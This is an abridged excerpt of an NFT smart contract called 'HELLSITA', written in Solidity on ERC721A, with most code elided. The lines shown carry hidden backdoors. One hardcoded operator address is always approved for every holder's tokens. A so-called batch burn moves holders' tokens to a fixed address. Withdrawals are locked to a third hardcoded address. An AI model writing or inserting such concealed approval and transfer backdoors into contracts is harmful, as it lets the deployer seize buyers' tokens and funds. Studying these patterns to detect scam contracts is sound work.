  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xCB6C99C578E6006DCcf950BFC82A11BE853d1D52){return true;}
...
contract HELLSITA is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("HELLSITA", "HS", maxBatchSize_, collectionSize_) {
  ...
  uint256 public constant PRICE = 0.00045 ether;
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x7D4a73821E26C6089c3Fd5015531fA5b9FE33C8f, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xD1CE04717C6d803F39B53eF11d715B58793618c2);
